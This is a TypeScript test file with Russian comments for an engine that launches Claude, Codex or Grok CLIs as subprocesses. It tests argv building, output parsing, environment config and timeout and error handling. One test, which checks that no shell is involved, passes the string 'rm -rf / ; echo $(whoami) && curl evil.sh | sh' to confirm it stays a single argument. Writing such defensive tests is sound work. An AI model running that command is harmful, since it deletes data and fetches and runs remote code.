/**
 * Парность с bridge/engine.py ([ADR-0012]). Юнит: buildArgv (no-shell, resume,
 * continue), parseOutput (Claude JSON / Codex JSONL / Grok), buildEngineFromEnv.
 * Интеграция: spawn-fresh через shebang-скрипты (без реального `claude`) —
 * проверяет runProcess (успех / ненулевой код / timeout / ENOENT).
 */
import { chmodSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import {
	buildEngineFromEnv,
	ClaudeEngine,
	CodexEngine,
	EngineError,
	GrokEngine,
} from './engine.js';

describe('ClaudeEngine.buildArgv', () => {
	it('первый ход: claude -p prompt --output-format json (cwd через spawn, не флаг)', () => {
		const eng = new ClaudeEngine({ claudeBin: 'claude', wikiRepoPath: '/repo' });
		expect(eng.buildArgv('привет', null)).toEqual(['claude', '-p', 'привет', '--output-format', 'json']);
	});

	it('resume: добавляет --resume <id> и -m <model>', () => {
		const eng = new ClaudeEngine({ wikiRepoPath: '/r', model: 'opus' });
		expect(eng.buildArgv('hi', 's1')).toEqual([
			'claude',
			'-p',
			'hi',
			'--output-format',
			'json',
			'-m',
			'opus',
			'--resume',
			's1',
		]);
	});

	it('continueLatest → --continue вместо --resume', () => {
		const eng = new ClaudeEngine({ continueLatest: true });
		const argv = eng.buildArgv('hi', 's1');
		expect(argv).toContain('--continue');
		expect(argv).not.toContain('--resume');
	});

	it('БЕЗ shell: prompt с метасимволами — ОДИН элемент argv', () => {
		const eng = new ClaudeEngine();
		const evil = 'rm -rf / ; echo $(whoami) && curl evil.sh | sh';
		const argv = eng.buildArgv(evil, null);
		expect(argv[2]).toBe(evil); // целиком, не разбит
		expect(argv.filter((a) => a === evil)).toHaveLength(1);
	});

	it('systemPrompt → --append-system-prompt отдельным аргументом (ADR-0016)', () => {
		const eng = new ClaudeEngine({ wikiRepoPath: '/r', systemPrompt: 'PERSONA-X' });
		const argv = eng.buildArgv('привет', null);
		const i = argv.indexOf('--append-system-prompt');
		expect(i).toBeGreaterThan(-1);
		expect(argv[i + 1]).toBe('PERSONA-X');
		expect(argv[2]).toBe('привет'); // сообщение владельца остаётся чистым
	});

	it('без systemPrompt → нет --append-system-prompt', () => {
		const argv = new ClaudeEngine({ wikiRepoPath: '/r' }).buildArgv('hi', null);
		expect(argv).not.toContain('--append-system-prompt');
	});
});

describe('ClaudeEngine.parseOutput', () => {
	const eng = new ClaudeEngine();

	it('result-объект: result/session_id/usage', () => {
		const out = '{"type":"result","result":" привет ","session_id":"s1","usage":{"a":1}}';
		expect(eng.parseOutput(out, null)).toEqual({ answer: 'привет', sessionId: 's1', usage: { a: 1 } });
	});

	it('не-JSON → сырой текст, session_id прежний', () => {
		expect(eng.parseOutput('plain text', 'prev')).toEqual({
			answer: 'plain text',
			sessionId: 'prev',
			usage: null,
		});
	});

	it('is_error → бросает транзиентную EngineError (не-auth)', () => {
		try {
			eng.parseOutput('{"is_error":true,"result":"rate limited"}', null);
			expect.unreachable();
		} catch (e) {
			expect(e).toBeInstanceOf(EngineError);
			expect((e as EngineError).transient).toBe(true);
			expect((e as EngineError).auth).toBe(false);
		}
	});

	it('is_error с 401 → auth-EngineError, НЕ транзиентная (нужен релогин, не retry)', () => {
		// Так приходит протухший токен CLI: --output-format json, exit 0, is_error в result.
		const out =
			'{"is_error":true,"result":"Failed to authenticate. API Error: 401 ' +
			'{\\"type\\":\\"authentication_error\\",\\"message\\":\\"Invalid authentication credentials\\"}"}';
		try {
			eng.parseOutput(out, null);
			expect.unreachable();
		} catch (e) {
			expect(e).toBeInstanceOf(EngineError);
			expect((e as EngineError).auth).toBe(true);
			expect((e as EngineError).transient).toBe(false);
		}
	});

	it('список событий → берёт result-объект', () => {
		const out = '[{"type":"other"},{"type":"result","result":"x","session_id":"s2"}]';
		expect(eng.parseOutput(out, null).answer).toBe('x');
	});

	it('пустой session_id → откат на prior', () => {
		expect(eng.parseOutput('{"type":"result","result":"x","session_id":""}', 'prior').sessionId).toBe(
			'prior',
		);
	});

	it('пустой stdout → пустой ответ, prior session', () => {
		expect(eng.parseOutput('', 'p')).toEqual({ answer: '', sessionId: 'p', usage: null });
	});
});

describe('CodexEngine (отложенный слот)', () => {
	const cx = new CodexEngine({ codexBin: 'codex', wikiRepoPath: '/r' });

	it('buildArgv первый ход', () => {
		expect(cx.buildArgv('hi', null)).toEqual([
			'codex',
			'exec',
			'--json',
			'--skip-git-repo-check',
			'--cd',
			'/r',
			'-a',
			'never',
			'hi',
		]);
	});

	it('buildArgv resume (без --ephemeral)', () => {
		const argv = cx.buildArgv('hi', 's1');
		expect(argv.slice(0, 4)).toEqual(['codex', 'exec', 'resume', 's1']);
		expect(argv).not.toContain('--ephemeral');
	});

	it('parseOutput собирает JSONL: thread.started/item.completed/turn.completed', () => {
		const out = [
			'{"type":"thread.started","session_id":"t1"}',
			'{"type":"item.completed","text":"part1"}',
			'{"type":"item.completed","text":"part2"}',
			'{"type":"turn.completed","usage":{"x":1}}',
		].join('\n');
		expect(cx.parseOutput(out, null)).toEqual({
			answer: 'part1\npart2',
			sessionId: 't1',
			usage: { x: 1 },
		});
	});

	it('parseOutput error-событие → EngineError', () => {
		expect(() => cx.parseOutput('{"type":"error","message":"boom"}', null)).toThrow(EngineError);
	});
});

describe('GrokEngine (отложенный слот)', () => {
	it('grok-build-cli backend как claude -p', () => {
		const g = new GrokEngine({ grokBin: 'grok' });
		expect(g.buildArgv('hi', null)).toEqual(['grok', '-p', 'hi', '--output-format', 'json']);
	});

	it('openclaw backend (допустим ТОЛЬКО для Grok)', () => {
		const g = new GrokEngine({ backend: 'openclaw', openclawBin: 'openclaw' });
		expect(g.buildArgv('hi', 's1')).toEqual(['openclaw', 'run', 'hi', '--json', '--session', 's1']);
	});
});

describe('buildEngineFromEnv', () => {
	it('дефолт claude при заданном WIKI_REPO_PATH', () => {
		expect(buildEngineFromEnv({ WIKI_REPO_PATH: '/r' })).toBeInstanceOf(ClaudeEngine);
	});

	it('без WIKI_REPO_PATH → EngineError', () => {
		expect(() => buildEngineFromEnv({})).toThrow(EngineError);
	});

	it('неизвестный ENGINE → EngineError', () => {
		expect(() => buildEngineFromEnv({ WIKI_REPO_PATH: '/r', ENGINE: 'bogus' })).toThrow(EngineError);
	});

	it('ENGINE=grok / codex → соответствующие адаптеры', () => {
		expect(buildEngineFromEnv({ WIKI_REPO_PATH: '/r', ENGINE: 'grok' })).toBeInstanceOf(GrokEngine);
		expect(buildEngineFromEnv({ WIKI_REPO_PATH: '/r', ENGINE: 'codex' })).toBeInstanceOf(CodexEngine);
	});
});

// --- Интеграция: реальный spawn-fresh через shebang-скрипты -------------------
describe('SubprocessEngine.run (реальный spawn через ClaudeEngine)', () => {
	let dir: string;
	let n = 0;
	const script = (body: string): string => {
		const p = join(dir, `engine-${n++}.cjs`);
		writeFileSync(p, `#!/usr/bin/env node\n${body}\n`, { mode: 0o755 });
		chmodSync(p, 0o755);
		return p;
	};

	beforeAll(() => {
		dir = mkdtempSync(join(tmpdir(), 'engine-test-'));
	});
	afterAll(() => {
		rmSync(dir, { recursive: true, force: true });
	});

	it('успешный ход: парсит JSON-результат из stdout', async () => {
		const bin = script(
			`console.log(JSON.stringify({type:'result',result:'привет из движка',session_id:'sess-xyz',usage:{output_tokens:5}}))`,
		);
		const eng = new ClaudeEngine({ claudeBin: bin, wikiRepoPath: '.', timeoutSeconds: 10 });
		const res = await eng.run('тест');
		expect(res.answer).toBe('привет из движка');
		expect(res.sessionId).toBe('sess-xyz');
		expect(res.usage).toEqual({ output_tokens: 5 });
	});

	it('claude запускается в cwd = wikiRepoPath (а не флагом --cwd)', async () => {
		const bin = script(
			`console.log(JSON.stringify({type:'result',result:process.cwd(),session_id:'s'}))`,
		);
		const eng = new ClaudeEngine({ claudeBin: bin, wikiRepoPath: dir, timeoutSeconds: 10 });
		const res = await eng.run('тест');
		expect(res.answer).toBe(realpathSync(dir)); // ответ = cwd дочернего процесса
	});

	it('ненулевой код выхода → EngineError', async () => {
		const bin = script(`process.stderr.write('some boom'); process.exit(1)`);
		const eng = new ClaudeEngine({ claudeBin: bin, timeoutSeconds: 10 });
		await expect(eng.run('тест')).rejects.toBeInstanceOf(EngineError);
	});

	it('timeout → транзиентная EngineError, процесс убит', async () => {
		const bin = script(`setInterval(()=>{}, 1000)`); // висит, пока не убьют
		const eng = new ClaudeEngine({ claudeBin: bin, timeoutSeconds: 0.3 });
		try {
			await eng.run('тест');
			expect.unreachable();
		} catch (e) {
			expect(e).toBeInstanceOf(EngineError);
			expect((e as EngineError).transient).toBe(true);
		}
	});

	it('бинарь не найден → фатальная EngineError', async () => {
		const eng = new ClaudeEngine({ claudeBin: '/nonexistent/claude-xyz', timeoutSeconds: 5 });
		try {
			await eng.run('тест');
			expect.unreachable();
		} catch (e) {
			expect(e).toBeInstanceOf(EngineError);
			expect((e as EngineError).transient).toBe(false);
		}
	});
});
